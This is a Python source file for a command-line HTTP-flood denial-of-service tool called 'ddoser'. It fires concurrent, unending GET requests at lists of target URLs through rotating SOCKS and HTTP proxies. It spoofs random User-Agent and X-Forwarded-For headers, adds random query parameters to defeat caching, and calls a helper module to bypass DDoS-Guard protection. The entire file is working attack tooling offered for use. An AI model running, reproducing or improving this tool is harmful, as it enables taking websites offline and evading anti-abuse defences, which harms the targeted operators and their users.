#!/usr/bin/env python
import asyncio
import json
import multiprocessing
import re
from http import HTTPStatus

import uvloop
import logging
import os
from collections import defaultdict
from itertools import cycle
from random import randint
from typing import Iterable, List, NamedTuple, Tuple, Dict, Optional
import urllib.parse as urlparse
from urllib.parse import urlencode


import aiohttp
import click
import requests as requests
from aiohttp_socks import ProxyConnector
from cachetools import TTLCache
from datetime import datetime, timedelta

import ddos_guard
from commons import config_logger, set_limits, load_proxies, Proxy

from fake_useragent import UserAgent

STATS = defaultdict(int)
URL_ERRORS_COUNT = defaultdict(int)
URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
DDOS_GUARD_COOKIE_CACHE = TTLCache(maxsize=100, ttl=timedelta(hours=1), timer=datetime.now) # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
UA_FALLBACK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"


class Settings(NamedTuple):
    target_url: str
    target_urls_file: str
    proxy_url: str
    proxy_file: str
    concurrency: int
    count: int
    timeout: int
    verbose: bool
    ignore_response: bool
    with_random_get_param: bool
    user_agent: str
    log_to_stdout: bool
    restart_period: int
    random_xff_ip: bool
    custom_headers_dict: Dict[str, str]
    stop_attack: int
    shuffle_proxy: bool
    proxy_custom_format: str
    stop_attack_on_forbidden: bool
    reset_errors_on_success: bool


async def make_request(url: str, target_url: str, proxy: Proxy, headers: Dict[str, str], settings: Settings):
    timeout = aiohttp.ClientTimeout(total=settings.timeout)
    logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
    base_url = target_url.split('?', 1)[0]
    try:
        request_kwargs = {}
        if proxy and proxy.protocol in ('socks4', 'socks5'):
            connector = ProxyConnector.from_url(proxy.get_formatted())
            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        else:
            if proxy:
                request_kwargs['proxy'] = proxy.get_formatted()
            client_session = aiohttp.ClientSession(timeout=timeout)
        client_session.headers.update(headers)

        async with client_session as session:
            cookies = DDOS_GUARD_COOKIE_CACHE.get(base_url)
            async with session.get(url, cookies=cookies, ssl=False, **request_kwargs) as response:
                if not settings.ignore_response:
                    await response.text()

                if response.status == HTTPStatus.FORBIDDEN and response.headers["server"].lower() == "ddos-guard":
                    ddos_guard_cookies, response = await ddos_guard.bypass(url, response.cookies, session=session, ignore_response=settings.ignore_response)
                    DDOS_GUARD_COOKIE_CACHE[base_url] = ddos_guard_cookies
                elif response.status >= HTTPStatus.INTERNAL_SERVER_ERROR or (settings.stop_attack_on_forbidden and response.status == HTTPStatus.FORBIDDEN):
                    URL_ERRORS_COUNT[base_url] += 1
                elif settings.reset_errors_on_success:
                    URL_ERRORS_COUNT[base_url] = 0

                URL_STATUS_STATS[base_url][response.status] += 1
                logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)

    except Exception as error:
        logging.warning('Url: %s Proxy: %s Error(%s): %s', url, proxy, type(error), error)
        STATS[f'{type(error)}'] += 1
        URL_ERRORS_COUNT[base_url] += 1
        URL_STATUS_STATS[base_url]['other_error'] += 1
    else:
        STATS['success'] += 1


def get_proxy(proxy_iterator: Iterable[Proxy]) -> Proxy:
    try:
        return next(proxy_iterator)
    except StopIteration:
        return None


def prepare_url(url: str, with_random_get_param: bool):
    if with_random_get_param:
        url_parts = list(urlparse.urlparse(url))
        query = dict(urlparse.parse_qsl(url_parts[4]))
        query.update({f'param_{randint(0, 1000)}': str(randint(0, 100000))})
        url_parts[4] = urlencode(query)
        return urlparse.urlunparse(url_parts)
    return url


def make_headers(
        user_agent: str, random_xff_ip: bool, custom_headers: Dict[str, str], target_headers: List[Tuple[str, str]], ua: UserAgent
) -> Dict[str, str]:
    headers = {}
    headers['User-Agent'] = user_agent if user_agent else ua.random
    if random_xff_ip:
        headers['X-Forwarded-For'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
    if custom_headers:
        headers.update(custom_headers)
    if target_headers:
        headers.update(target_headers)
    return headers


def split_target(target: str):
    target_url = re.split(r"[\s+]", target)[0]
    target_headers = re.findall(r"\s*\+\s*(\S+?):\s*([^\s+]+)", target)
    return target_url, target_headers


async def ddos(
        target: str, proxy_iterator: Iterable[Proxy], ua: UserAgent, settings: Settings
):
    target_url, target_headers = split_target(target)
    step = 0
    while True:
        if settings.count and step > settings.count:
            break

        base_url = target_url.split('?', 1)[0]
        error_count = URL_ERRORS_COUNT[base_url]
        if settings.stop_attack and error_count > settings.stop_attack:
            logging.warning(
                "Stopping attack on %s as the error count %d is more than the threshold %d",
                target_url,
                error_count,
                settings.stop_attack,
            )
            break
        step += 1
        proxy = get_proxy(proxy_iterator)
        headers = make_headers(settings.user_agent, settings.random_xff_ip, settings.custom_headers_dict, target_headers, ua)
        await make_request(prepare_url(target_url, settings.with_random_get_param), target_url, proxy,
                           headers, settings)
        log_stats()


def log_stats():
    if sum(STATS.values()) % 10000 == 0:
        for target, statuses in URL_STATUS_STATS.items():
            logging.critical(json.dumps({'target': target, **statuses}))


async def amain(
        targets: List[str], proxies: List[Proxy], ua: UserAgent, settings: Settings,
):
    coroutines = []
    proxy_iterator = cycle(proxies or [])
    for target in targets:
        for _ in range(settings.concurrency):
            coroutines.append(
                ddos(target, proxy_iterator, ua, settings)
            )
    await asyncio.gather(*coroutines)

def normalize_url(url: str) -> Optional[str]:
    url = url.strip()

    if url.startswith("# ") or url == "":
        return None

    return url.split(" #")[0].strip()

def load_targets(target_urls_files: Tuple[str]) -> List[str]:
    target_urls = []
    for target_urls_file in target_urls_files:
        if os.path.isfile(target_urls_file):
            with open(target_urls_file) as f:
                for line in f:
                    url = normalize_url(line)
                    if url is not None:
                        target_urls.append(url)
        else:
            try:
                res = requests.get(target_urls_file, verify=False)
                for line in res.text.splitlines():
                    url = normalize_url(line)
                    if url is not None:
                        target_urls.append(url)
            except:
                pass
    logging.info('Loaded %s targets to ddos', len(target_urls))
    return target_urls


def build_targets(target_urls: Tuple[str], target_urls_files: Tuple[str]) -> List[str]:
    normalized_urls = load_targets(target_urls_files)
    for url in target_urls:
        normalized_url = normalize_url(url)
        if normalized_url is not None:
            normalized_urls.append(normalized_url)

    return list(set(normalized_urls))


def process(settings: Settings):
    config_logger(settings.verbose, settings.log_to_stdout)
    uvloop.install()
    set_limits()
    proxies = load_proxies(settings.proxy_file, settings.proxy_url, shuffle=settings.shuffle_proxy, custom_format=settings.proxy_custom_format)
    targets = build_targets(settings.target_url, settings.target_urls_file)
    ua = UserAgent(fallback = UA_FALLBACK)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(
        amain(targets, proxies, ua, settings)
    )
    for key, value in STATS.items():
        if key != 'success':
            logging.info("%s: %s", key, value)
    logging.info('success: %s', STATS["success"])


def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[str, str]:
    headers = {}
    if header:
        headers.update(header)
    if custom_headers:
        headers.update(json.loads(custom_headers))
    return headers


@click.command(help="Run ddoser")
@click.option('--target-url', help='ddos target url', multiple=True)
@click.option('--target-urls-file', help='path or url to file contains urls to ddos', multiple=True)
@click.option('--proxy-url', help='url to proxy resourсe')
@click.option('--proxy-file', help='path to file with proxy list')
@click.option('--concurrency', help='concurrency level', type=int, default=1)
@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
@click.option('--timeout', help='requests timeout', type=int, default=5)
@click.option('-v', '--verbose', help='Show verbose log', count=True)
@click.option('--ignore-response', help='do not wait for response body', is_flag=True, default=False)
@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
@click.option('--user-agent', help='custom user agent')
@click.option('--log-to-stdout', help='log to console', is_flag=True)
@click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
@click.option('--random-xff-ip', help='set random ip address value for X-Forwarder-For header', is_flag=True, default=False)
@click.option('--custom-headers', help='set custom headers as json', default='{}', type=str)
@click.option('--stop-attack', help='stop the attack when the target is down after N tries', type=int, default=0)
@click.option('--shuffle-proxy', help='Shuffle proxy list on application start', is_flag=True, default=False)
@click.option('-H', '--header', multiple=True, help='custom header', type=(str, str))
@click.option('--proxy-custom-format', help='custom proxy format like "{protocol}://{ip}:{port} {login}:{password}" '
                                            '(ip and port is required, protocol can be set by --protocol)')
@click.option('--stop-attack-on-forbidden', help='Stop attack takes into account errors like time outs and 5xx, if this flag is set, stop attack on forbidden as well', is_flag=True, default=False)
@click.option('--reset-errors-on-success', help='If number of errors more than the threshold we stop attack, reset the error counter if a request succeeds', is_flag=True, default=False)
def main(
        target_url: List[str], target_urls_file: str, proxy_url: str, proxy_file: str,
        concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
        user_agent: str, log_to_stdout: bool, restart_period: int, random_xff_ip: bool, custom_headers: str,
        stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]], proxy_custom_format: str,
        stop_attack_on_forbidden: bool, reset_errors_on_success: bool,
):
    config_logger(verbose, log_to_stdout)
    if not target_urls_file and not target_url:
        raise SystemExit('--target-url or --target-urls-file is required')
    settings = Settings(
        target_url=target_url,
        target_urls_file=target_urls_file,
        proxy_url=proxy_url,
        proxy_file=proxy_file,
        concurrency=concurrency,
        count=count,
        timeout=timeout,
        verbose=verbose,
        ignore_response=ignore_response,
        with_random_get_param=with_random_get_param,
        user_agent=user_agent,
        log_to_stdout=log_to_stdout,
        restart_period=restart_period,
        random_xff_ip=random_xff_ip,
        custom_headers_dict=merge_headers(custom_headers, header),
        stop_attack=stop_attack,
        shuffle_proxy=shuffle_proxy,
        proxy_custom_format=proxy_custom_format,
        stop_attack_on_forbidden=stop_attack_on_forbidden,
        reset_errors_on_success=reset_errors_on_success,
    )
    while True:
        proc = multiprocessing.Process(
            target=process,
            args=(settings,)
        )
        proc.start()
        proc.join(restart_period)
        if proc.exitcode is None:
            logging.info('Killing the process by restart period')
            proc.kill()
            proc.join()
        if restart_period is None:
            break


if __name__ == '__main__':
    main()
